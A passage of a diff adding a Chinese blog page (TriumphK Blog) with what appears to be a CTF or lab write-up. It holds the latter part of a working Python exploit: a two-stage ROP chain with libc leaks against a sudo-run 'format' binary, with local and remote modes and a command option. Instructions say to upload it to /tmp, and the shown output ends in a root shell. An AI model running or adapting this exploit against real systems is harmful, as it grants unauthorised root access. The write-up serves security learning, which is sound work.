+    if not stage2:
+        sys.stderr.write(&quot;[-] stage2 contains scanf-terminating bytes, retrying\n&quot;)
+        sys.stderr.flush()
+        return False
+
+    tube.send(stage2)
+    time.sleep(1.0)
+    tube.drain_quiet(quiet_time=0.2, max_time=3.0)
+    if post_cmd is not None:
+        marker = b&quot;__CMD_DONE_5f31e7__&quot;
+        wrapped = b&quot;{ &quot; + post_cmd + b&quot;; }; printf '&quot; + marker + b&quot;\\n'; exit\n&quot;
+        tube.send(wrapped)
+        output = tube.recv_until(lambda data: marker in data, timeout=5.0)
+        if marker in output:
+            output = output.split(marker, 1)[0]
+        sys.stdout.buffer.write(output)
+        sys.stdout.buffer.flush()
+        return True
+    tube.interactive()
+    return True
+
+
+def exploit_local(argv, attempts: int = 64, post_cmd: Optional[bytes] = None) -&gt; None:
+    last_error = None
+    binary_path = argv[-1]
+    libc_profiles = []
+    try:
+        auto_profile = parse_local_libc_profile(binary_path)
+        libc_profiles.append(auto_profile)
+        sys.stderr.write(f&quot;[+] auto libc profile: {auto_profile['name']}\n&quot;)
+        sys.stderr.flush()
+    except Exception as exc:
+        sys.stderr.write(f&quot;[-] auto libc parse failed for {binary_path}: {exc}\n&quot;)
+        sys.stderr.flush()
+    libc_profiles.extend(FALLBACK_LIBC_PROFILES)
+
+    for attempt in range(1, attempts + 1):
+        sys.stderr.write(f&quot;[+] attempt {attempt}/{attempts}: {' '.join(argv)}\n&quot;)
+        sys.stderr.flush()
+        tube = LocalTube(argv)
+        try:
+            if exploit_once(tube, libc_profiles, post_cmd=post_cmd):
+                return
+        except Exception as exc:
+            last_error = exc
+            sys.stderr.write(f&quot;[-] attempt {attempt} failed: {exc}\n&quot;)
+            sys.stderr.flush()
+        finally:
+            try:
+                tube.close()
+            except Exception:
+                pass
+    if last_error is not None:
+        raise last_error
+    raise RuntimeError(&quot;exhausted attempts without a usable stage2 chain&quot;)
+
+
+def exploit_remote(host: str, port: int, post_cmd: Optional[bytes] = None) -&gt; None:
+    tube = RemoteTube(host, port)
+    try:
+        if not exploit_once(tube, FALLBACK_LIBC_PROFILES, post_cmd=post_cmd):
+            raise RuntimeError(&quot;remote run hit scanf-terminating bytes in stage2; reconnect and retry&quot;)
+    finally:
+        try:
+            tube.close()
+        except Exception:
+            pass
+
+
+def parse_args():
+    parser = argparse.ArgumentParser(description=&quot;Exploit the vulnerable format binary&quot;)
+    parser.add_argument(&quot;--local&quot;, action=&quot;store_true&quot;, help=&quot;use ./format instead of sudo /usr/local/bin/format&quot;)
+    parser.add_argument(&quot;--cmd&quot;, help=&quot;send one command after shell spawn, then print its output&quot;)
+    parser.add_argument(&quot;host&quot;, nargs=&quot;?&quot;)
+    parser.add_argument(&quot;port&quot;, nargs=&quot;?&quot;)
+    return parser.parse_args()
+
+
+def main() -&gt; int:
+    args = parse_args()
+    post_cmd = args.cmd.encode() if args.cmd is not None else None
+
+    if args.host is None and args.port is None:
+        exploit_local(TEST_LOCAL_ARGV if args.local else DEFAULT_LOCAL_ARGV, post_cmd=post_cmd)
+    elif args.host is not None and args.port is not None and not args.local:
+        exploit_remote(args.host, int(args.port), post_cmd=post_cmd)
+    else:
+        print(f&quot;usage: {sys.argv[0]} [--local] [--cmd COMMAND] [HOST PORT]&quot;, file=sys.stderr)
+        return 1
+    return 0
+
+
+if __name__ == &quot;__main__&quot;:
+    raise SystemExit(main())
+</code></pre>
+<p>将脚本上传到目标机器的 <code>/tmp</code> 目录，直接运行。</p>
+<pre lang="bash"><code>python3 exploit.py
+</code></pre>
+<p>脚本默认会调用 <code>sudo -n /usr/local/bin/format</code>，自动完成两阶段 ROP 攻击。</p>
+<pre><code>[+] auto libc profile: auto:/lib/i386-linux-gnu/libc.so.6
+[+] attempt 1/64: sudo -n /usr/local/bin/format
+[+] raw leaks: __libc_start_main=0xf7dd4540, __isoc99_scanf=0xf7e2ad10, stack_buf=0xffc678ac
+[+] libc profile = auto:/lib/i386-linux-gnu/libc.so.6, libc_base = 0xf7dba000
+# id
+uid=0(root) gid=0(root) groups=0(root)
+</code></pre>
+<p>一发入魂，root shell 到手。</p>
+</div>
+<div style="font-size:small;margin-top:8px;float:right;"></div>
+
+<button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">评论</button>
+<div class="comments" id="comments"></div>
+
+</div>
+    <div id="footer"><div id="footer1">Copyright © <span id="copyrightYear"></span> <a href="https://7r1UMPHK.github.io">TriumphK Blog</a></div>
+<div id="footer2">
+    <span id="runday"></span><span>Powered by <a href="https://meekdai.com/Gmeek.html" target="_blank">Gmeek</a></span>
+</div>
+
+<script>
+var now=new Date();
+document.getElementById("copyrightYear").innerHTML=now.getFullYear();
+
+if(""!=""){
+    var startSite=new Date("");
+    var diff=now.getTime()-startSite.getTime();
+    var diffDay=Math.floor(diff/(1000*60*60*24));
+    document.getElementById("runday").innerHTML="网站运行"+diffDay+"天"+" • ";
+}
+</script></div>
+</body>
+<script>
+var IconList={'sun': 'M8 10.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5zM8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0V.75A.75.75 0 018 0zm0 13a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0v-1.5A.75.75 0 018 13zM2.343 2.343a.75.75 0 011.061 0l1.06 1.061a.75.75 0 01-1.06 1.06l-1.06-1.06a.75.75 0 010-1.06zm9.193 9.193a.75.75 0 011.06 0l1.061 1.06a.75.75 0 01-1.06 1.061l-1.061-1.06a.75.75 0 010-1.061zM16 8a.75.75 0 01-.75.75h-1.5a.75.75 0 010-1.5h1.5A.75.75 0 0116 8zM3 8a.75.75 0 01-.75.75H.75a.75.75 0 010-1.5h1.5A.75.75 0 013 8zm10.657-5.657a.75.75 0 010 1.061l-1.061 1.06a.75.75 0 11-1.06-1.06l1.06-1.06a.75.75 0 011.06 0zm-9.193 9.193a.75.75 0 010 1.06l-1.06 1.061a.75.75 0 11-1.061-1.06l1.06-1.061a.75.75 0 011.061 0z', 'moon': 'M9.598 1.591a.75.75 0 01.785-.175 7 7 0 11-8.967 8.967.75.75 0 01.961-.96 5.5 5.5 0 007.046-7.046.75.75 0 01.175-.786zm1.616 1.945a7 7 0 01-7.678 7.678 5.5 5.5 0 107.678-7.678z', 'sync': 'M1.705 8.005a.75.75 0 0 1 .834.656 5.5 5.5 0 0 0 9.592 2.97l-1.204-1.204a.25.25 0 0 1 .177-.427h3.646a.25.25 0 0 1 .25.25v3.646a.25.25 0 0 1-.427.177l-1.38-1.38A7.002 7.002 0 0 1 1.05 8.84a.75.75 0 0 1 .656-.834ZM8 2.5a5.487 5.487 0 0 0-4.131 1.869l1.204 1.204A.25.25 0 0 1 4.896 6H1.25A.25.25 0 0 1 1 5.75V2.104a.25.25 0 0 1 .427-.177l1.38 1.38A7.002 7.002 0 0 1 14.95 7.16a.75.75 0 0 1-1.49.178A5.5 5.5 0 0 0 8 2.5Z', 'home': 'M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z', 'github': 'M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z'};
+var utterancesLoad=0;
+
+console.log("\n %c Gmeek main https://github.com/Meekdai/Gmeek \n","padding:5px 0;background:#02d81d;color:#fff");
+</script>
+
+<script>
+document.getElementById("pathHome").setAttribute("d",IconList["home"]);
+document.getElementById("pathIssue").setAttribute("d",IconList["github"]);
+
+
+
+function openComments(){
+    cm=document.getElementById("comments");
+    cmButton=document.getElementById("cmButton");
+    cmButton.disabled=true;
+    cmButton.innerHTML="loading";
+    span=document.createElement("span");
+    span.setAttribute("class","AnimatedEllipsis");
+    cmButton.appendChild(span);
+
+    script=document.createElement("script");
+    script.setAttribute("src","https://utteranc.es/client.js");
+    script.setAttribute("repo","7r1UMPHK/7r1UMPHK.github.io");
+    script.setAttribute("issue-term","title");
+    
+    script.setAttribute("theme","github-light");
+    
+    script.setAttribute("crossorigin","anonymous");
+    script.setAttribute("async","");
+    cm.appendChild(script);
+
+    int=self.setInterval("iFrameLoading()",200);
+}
+
+function iFrameLoading(){
+    var utterances=document.getElementsByClassName('utterances');
+    if(utterances.length==1){
+        if(utterances[0].style.height!=""){
+            utterancesLoad=1;
+            int=window.clearInterval(int);
+            document.getElementById("cmButton").style.display="none";
+            console.log("utterances Load OK");
+        }
+    }
+}
+
+
+
+</script>
+</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>
+
+</html>
